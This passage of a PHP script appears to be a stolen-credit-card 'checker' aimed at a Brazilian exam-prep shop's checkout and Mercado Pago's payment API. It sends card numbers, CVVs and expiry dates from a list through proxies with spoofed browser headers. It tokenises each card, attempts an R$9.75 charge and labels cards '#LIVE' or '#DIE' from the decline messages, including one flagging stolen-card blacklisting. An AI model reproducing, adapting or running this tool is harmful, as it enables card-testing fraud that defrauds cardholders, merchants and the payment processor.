curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'authorization: Bearer '.$bearer.'',
    'content-type: application/json',
    'origin: https://checkout.novaconcursos.com.br',
    'priority: u=1, i',
    'referer: https://checkout.novaconcursos.com.br/',
    'sec-ch-ua: "Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: '.$userAgents.'',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"name":"'.$nome.' '.$sobrenome.'","cpf":"'.$cpf.'","phone":"(62) 99201-'.rand(1111,9999).'","zipcode":"74620-150","address":"Rua 10","number":"22","district":"Setor Morais","city":"Goiânia","state":"GO","complement":"QD 122","reference":""}');
$response = curl_exec($ch);
curl_close($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.novaconcursos.com.br/api/v1/cart/customer/address/default');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'authorization: Bearer '.$bearer.'',
    'origin: https://checkout.novaconcursos.com.br',
    'priority: u=1, i',
    'referer: https://checkout.novaconcursos.com.br/',
    'sec-ch-ua: "Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: '.$userAgents.'',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
$response = curl_exec($ch);
curl_close($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.novaconcursos.com.br/api/v1/cart');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'authorization: Bearer '.$bearer.'',
    'origin: https://checkout.novaconcursos.com.br',
    'priority: u=1, i',
    'referer: https://checkout.novaconcursos.com.br/',
    'sec-ch-ua: "Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: '.$userAgents.'',
]);
//curl_setopt($ch, CURLOPT_COOKIE, '_gcl_au=1.1.1141954730.1740725686; _ga=GA1.1.1920098808.1740725686; _fbp=fb.2.1740725686085.77493144371791877; _uetsid=e540f930f5a011efa79a77f17cf28239; _uetvid=e5412fe0f5a011efa2b11f4a32a949bd; __goc_session__=bzkvlrlklquuynxnbeufzkjaayeaqmpg; session_token=097d6e00-fce4-4bc2-9379-230dff4e253e; frontendcart=%7B%22total%22%3A1%2C%22name%22%3Anull%7D; FPID=FPID2.3.LKtCAB1TR9COIyyoAJ2zO43AQiSYewAxjOU%2BjYQYBUw%3D.1740725686; blueID=55eacf58-9f3f-41c8-b1d1-840dce176f39; app_uuid=cae178a9-f7c2-43c1-a386-ca4ab10d1b49; app_session_uuid=4e1b5c72-842d-40db-9bed-7bb04d04de24; _tt_enable_cookie=1; _ttp=01JN5NC94YZC0KWS2WREEKZK3M_.tt.2; FPLC=aR7eNV3rNzRi5hFqSGKS2UFxQzPCFR8ofEBDy0zRu6RAA21k5XSZruMGqJwMAtLfw2tkUS2gtg9DsDcENyMTWuTHDUjqL4UgZqjri5sK4I0UhKJULHG8ttl1Pl97Dg%3D%3D; cto_bundle=Do76gV85cFdmUzdNU1dKbHA3UjJzdHZQZUpOOWJ4bDlvVzhGJTJCdkRUNkF3eXI2bjVObmhkcTNRa2lQdUJNa29HOFhENnJjbXo3Z3N5ajZSN05rSjBzRXRGaHZUQnVSVyUyQlNLN0ZGMmdyMEJKV1hiZFppTU1aczV4eTBLRk9EU3EwUUJTRW8yY1RVUEdqUXVaVHNFZTh4N3VYd2twVVpiY2ZLR3VaVkdoUEdKJTJCNGFDaHclM0Q; _ga_JSHF1DKJSS=GS1.1.1740725685.1.0.1740725730.15.0.0');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
$response = curl_exec($ch);
curl_close($ch);



sleep(3);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.mercadopago.com/v1/devices/widgets?public_key=APP_USR-c6cc5d82-0653-48ba-8841-5378b03e8ee9&locale=pt-BR&js_version=2.47.2&referer=https%3A%2F%2Fcheckout.novaconcursos.com.br');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: */*',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'content-type: text/plain;charset=UTF-8',
    'origin: https://checkout.novaconcursos.com.br',
    'priority: u=1, i',
    'referer: https://checkout.novaconcursos.com.br/',
    'sec-ch-ua: "Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'user-agent: '.$userAgents.'',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"section":"open_platform_V2","view":"checkout"}');
 $response = curl_exec($ch);
 $data = json_decode($response, true);
 $armor = $data['session_id'] ?? null;


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.mercadopago.com/v1/payment_methods/search?public_key=APP_USR-c6cc5d82-0653-48ba-8841-5378b03e8ee9&locale=pt-BR&js_version=2.47.2&referer=https%3A%2F%2Fcheckout.novaconcursos.com.br&marketplace=NONE&status=active&product_id=BTR2N61O1F60OR8RLSGG&bins='.$bin.'&processing_mode=aggregator');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: */*',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'origin: https://checkout.novaconcursos.com.br',
    'priority: u=1, i',
    'referer: https://checkout.novaconcursos.com.br/',
    'sec-ch-ua: "Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'user-agent: '.$userAgents.'',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
$v1 = curl_exec($ch);
$json = json_decode($v1, true);
$issuer = $json['results'][0]['issuer']['id'];
$issuer_name = $json['results'][0]['issuer']['name'];
switch ($issuer_name) {
    case "Mastercard":
        $issuer_name = "master";
        break;
    case "Visa":
        $issuer_name = "visa";
        break;
    case "Elo":
        $issuer_name = "elo";
        break; 
    case "C6 BANK":
        $issuer_name = "master";
        break; 
    case "Santander":
        if ($tipo == "Visa") {
        $issuer_name = "visa";
        } else {
         $issuer_name = "master";
        }
        break; 
    case "Itaú":
        if ($tipo == "Visa") {
        $issuer_name = "visa";
        } else {
        $issuer_name = "master";
        }
        break;
    case "BANCO ORIGINAL SA":
        if ($tipo == "Visa") {
        $issuer_name = "visa";
        } else {
        $issuer_name = "master";
        }
        break;
    case "Nubank":
        $issuer_name = "master";
        break; 
    case "BANCO BMG SA":
        if ($tipo == "Visa") {
        $issuer_name = "visa";
        } else {
        $issuer_name = "master";
        }
        break;
    case "BANCO INTER S.A.":
        if ($tipo == "Visa") {
         $issuer_name = "visa";
        } else {
        $issuer_name = "master";
        }
        break;
    case "Banco Do Brasil S.A.":
        if ($tipo == "Visa") {
        $issuer_name = "visa";
        } else {
        $issuer_name = "master";
        }
    case "Cartão Mercado Pago":
        if ($tipo == "Visa") {
        $issuer_name = "visa";
        } else {
        $issuer_name = "master";
        }
        break;
    default: 
        $issuer_name = "$issuer_name";
        break;
}



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.mercadopago.com/v1/card_tokens?public_key=APP_USR-c6cc5d82-0653-48ba-8841-5378b03e8ee9&locale=pt-BR&js_version=2.47.2&referer=https%3A%2F%2Fcheckout.novaconcursos.com.br');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: */*',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'content-type: text/plain;charset=UTF-8',
    'origin: https://checkout.novaconcursos.com.br',
    'priority: u=1, i',
    'referer: https://checkout.novaconcursos.com.br/',
    'sec-ch-ua: "Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'user-agent: '.$userAgents.'',
    'x-product-id: BTR2N61O1F60OR8RLSGG',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"card_number":"'.$cc.'","cardholder":{"name":"'.$nome.' '.$sobrenome.'","identification":{"type":"CPF","number":"'.$cpf.'"}},"security_code":"'.$cvv.'","expiration_month":'.$mes.',"expiration_year":'.$ano.',"device":{"meli":{"session_id":"'.$armor.'"}}}');
$tokenCard = curl_exec($ch);
$capturar = json_decode($tokenCard, true);
$card_hash = $capturar['id'] ?? null;

if($ano < 2025){
    die(("<span class='badge badge-danger'> ❌ </span>
    <span class='badge badge-dark'> $lista </span>
    <span class='badge badge-danger'> Cartão Expirado </span>
    <span class='badge badge-dark'>BY: AUTHCENTERGG</span><br>"));
} 

if($ano == 2025 && $mes < 3){  
    die(("<span class='badge badge-danger'> ❌ </span>
    <span class='badge badge-dark'> $lista </span>
    <span class='badge badge-danger'> Cartão Expirado </span>  
    <span class='badge badge-dark'>BY: AUTHCENTERGG</span><br>"));
} 

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.novaconcursos.com.br/api/v1/cart/payment');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'authorization: Bearer '.$bearer.'',
    'content-type: application/json',
    'origin: https://checkout.novaconcursos.com.br',
    'priority: u=1, i',
    'referer: https://checkout.novaconcursos.com.br/',
    'sec-ch-ua: "Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: '.$userAgents.'',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"method":"mercadopago_cc","card_hash":"'.$card_hash.'","installments":1,"paymentMethodId":"'.$issuer_name.'","issuer":'.$issuer.'}');
$pay = curl_exec($ch);
curl_close($ch);

/*/####################/*/
###### CODER: @SEMNICKOFICIAL #######        
/*/###################/*/

$mm = capturar($pay,'"msg":"','"', 1);
$msg = unicode_decode($mm);


if($msg === 'Informações inválidas'){saveErro("$lista ($msg)");
    echo ("#INFO ➜ $cc|$mes|$ano2|$cvv - [$msg] ➜ Coder:@authcentergg"); 
}
if(strpos($pay,'CVV incorreto')){saveLive("Live: $lista ($msg)");
    echo ("#LIVE ➜ $cc|$mes|$ano2|$cvv - [$msg] ➜ Coder:@authcentergg"); 
}
elseif(strpos($pay,'Sucesso')){saveDebit("Live: $lista (R$9,75 realizado)");
    echo ("#LIVE ➜ $cc|$mes|$ano2|$cvv - [Pagamento Realizado R$ 9,75] ➜ Coder:@authcentergg"); 
}
elseif(strpos($pay,'Valor insuficiente')){saveInsuficiente("Live: $lista (Valor insuficiente - R$ 9,75)");
    echo ("#LIVE ➜ $cc|$mes|$ano2|$cvv - [Valor insuficiente R$ 9,75] ➜ Coder:@authcentergg"); 
}
elseif(strpos($pay,'lista negra por roubo')){
    echo ("#DIE ➜ $cc|$mes|$ano2|$cvv - [$msg] ➜ Coder:@authcentergg"); 
}
elseif(strpos($pay,'O pagamento foi rejeitado')){
    echo ("#DIE ➜ $cc|$mes|$ano2|$cvv - [$msg] ➜ Coder:@authcentergg"); 
}
else{
    echo ("#DIE ➜ $cc|$mes|$ano2|$cvv - [$msg] ➜ Coder:@authcentergg"); 
}

